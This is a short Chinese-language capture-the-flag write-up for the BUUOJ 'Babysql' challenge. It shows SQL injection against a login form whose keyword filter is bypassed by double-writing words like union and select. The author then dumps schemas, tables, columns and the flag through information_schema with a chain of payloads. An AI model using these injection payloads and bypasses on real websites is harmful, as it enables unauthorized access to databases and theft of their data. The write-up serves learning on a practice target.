### buuoj_[极客大挑战 2019]Babysql

打开一看又是熟悉的界面，看了下源代码，没什么东西

随便输了几个用户名密码进去，有报错，且username是双引号闭合，password是单引号闭合

试一下万能密码，但是好像有什么被过滤了（测试发现包括or and from where select union等）

再试试其他的

```
?username=admin&password=1' union select 1,2 #
```

很明显，union select  都被过滤了，试一下双写绕过

```
?username=admin&password=1 ' ununionion selselectect 1,2 #
```

这个井号不行，换成%23就可以了，再测一下就可以得到列数

![image-20210802182946588](C:\Users\EXCEPTION\AppData\Roaming\Typora\typora-user-images\image-20210802182946588.png)

接下来一套组合拳

```
#爆库
username=admin&password=1 %27 ununionion seselectlect 1,2,group_concat(schema_name) frfromom (infoorrmation_schema.schemata) %23
#爆表
?username=admin&password=1 ' ununionion selselectect 1,(seleselectct 
group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'),3  %23
#爆字段
?username=admin&password=1 %27 ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name="Flag" %23
#爆数据
?username=admin&password=1 %27 ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) %23
```

![](https://pic.imgdb.cn/item/6107cbbc5132923bf8272816.jpg)

完成